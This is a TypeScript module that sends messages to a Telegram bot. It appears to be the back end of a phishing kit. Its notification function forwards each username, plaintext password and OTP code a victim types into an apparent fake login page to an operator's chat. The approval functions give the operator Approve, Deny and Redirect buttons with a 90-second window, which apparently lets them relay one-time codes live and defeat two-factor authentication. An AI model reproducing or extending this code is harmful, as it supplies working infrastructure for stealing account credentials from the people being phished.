/**
 * Direct Telegram API service - NO SDK, direct fetch calls
 * Hardcoded credentials - WORKING version
 */

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || ""
const CHAT_ID =
  process.env.TELEGRAM_CHAT_ID ||
  process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ||
  process.env.TELEGRAM_CHAT_IDS?.split(",")[0]?.trim() ||
  process.env.NEXT_PUBLIC_TELEGRAM_CHAT_IDS?.split(",")[0]?.trim() ||
  ""
const TELEGRAM_API_URL = "https://api.telegram.org"

export async function sendTelegramMessage(
  text: string,
  parseMode: "HTML" | "Markdown" = "HTML",
  inlineKeyboard?: any[][]
): Promise<{ ok: boolean; error?: string }> {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      return { ok: false, error: "Telegram bot token or chat ID not configured" }
    }

    const url = `${TELEGRAM_API_URL}/bot${BOT_TOKEN}/sendMessage`

    const payload: any = {
      chat_id: CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    }

    if (inlineKeyboard && inlineKeyboard.length > 0) {
      payload.reply_markup = {
        inline_keyboard: inlineKeyboard,
      }
    }

    console.log("📤 Sending Telegram message:", {
      url: url.replace(BOT_TOKEN, "BOT_TOKEN_HIDDEN"),
      payload,
    })

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    })

    const result = await response.json()

    console.log("📩 Telegram response:", result)

    if (!response.ok || !result.ok) {
      const errorMsg = result.description || result.error || "Unknown error"
      console.error("❌ Telegram error:", errorMsg)
      return { ok: false, error: errorMsg }
    }

    console.log("✅ Telegram message sent successfully")
    return { ok: true }
  } catch (error) {
    const errorMsg = error instanceof Error ? error.message : String(error)
    console.error("❌ Telegram fetch error:", errorMsg)
    return { ok: false, error: errorMsg }
  }
}

export async function sendPasswordApproval(
  username: string,
  approvalId: string
): Promise<{ ok: boolean; error?: string }> {
  const message = `🔐 <b>Password Login Approval</b>
━━━━━━━━━━━━━━━━━━
🔹 <b>User ID:</b> <code>${username}</code>
🔹 <b>Approval ID:</b> <code>${approvalId.substring(0, 8)}</code>
🔹 <b>Time Limit:</b> <code>90 seconds</code>`

  const inlineKeyboard = [
    [
      {
        text: "✅ Approve",
        callback_data: `approve:${approvalId}`,
      },
      {
        text: "❌ Deny",
        callback_data: `deny:${approvalId}`,
      },
      {
        text: "🔄 Redirect",
        callback_data: `redirect:${approvalId}`,
      },
    ],
  ]

  return sendTelegramMessage(message, "HTML", inlineKeyboard)
}

export async function sendOtpApproval(
  username: string,
  approvalId: string
): Promise<{ ok: boolean; error?: string }> {
  const message = `🔐 <b>OTP Verification Approval</b>
━━━━━━━━━━━━━━━━━━
🔹 <b>User ID:</b> <code>${username}</code>
🔹 <b>Approval ID:</b> <code>${approvalId.substring(0, 8)}</code>
🔹 <b>Time Limit:</b> <code>90 seconds</code>`

  const inlineKeyboard = [
    [
      {
        text: "✅ Approve",
        callback_data: `approve:${approvalId}`,
      },
      {
        text: "❌ Deny",
        callback_data: `deny:${approvalId}`,
      },
      {
        text: "🔄 Redirect",
        callback_data: `redirect:${approvalId}`,
      },
    ],
  ]

  return sendTelegramMessage(message, "HTML", inlineKeyboard)
}

export async function sendSimpleNotification(
  type: string,
  data: Record<string, any>
): Promise<{ ok: boolean; error?: string }> {
  let message = ""

  switch (type) {
    case "username":
      message = `📝 <b>Username Entered</b>\n━━━━━━━━━━━━━━━━━━\n🔹 <b>User ID:</b> <code>${data.username}</code>`
      break
    case "password":
      message = `🔐 <b>Password Entered</b>\n━━━━━━━━━━━━━━━━━━\n🔹 <b>User ID:</b> <code>${data.username}</code>\n🔹 <b>Password:</b> <code>${data.password}</code>`
      break
    case "verification_method":
      message = `📱 <b>Verification Method Selected</b>\n━━━━━━━━━━━━━━━━━━\n🔹 <b>User ID:</b> <code>${data.username}</code>\n🔹 <b>Method:</b> <code>${data.verificationMethod === "email" ? "Email" : "SMS"}</code>`
      break
    case "verification_code":
      message = `✅ <b>OTP Code Entered</b>\n━━━━━━━━━━━━━━━━━━\n🔹 <b>User ID:</b> <code>${data.username}</code>\n🔹 <b>Code:</b> <code>${data.verificationCode}</code>`
      break
    case "code_requested":
      message = `🔔 <b>Resend Code Clicked</b>\n━━━━━━━━━━━━━━━━━━\n🔹 <b>User ID:</b> <code>${data.username}</code>`
      break
    default:
      message = `📢 <b>${type}</b>\n━━━━━━━━━━━━━━━━━━\n${JSON.stringify(data, null, 2)}`
  }

  return sendTelegramMessage(message, "HTML")
}
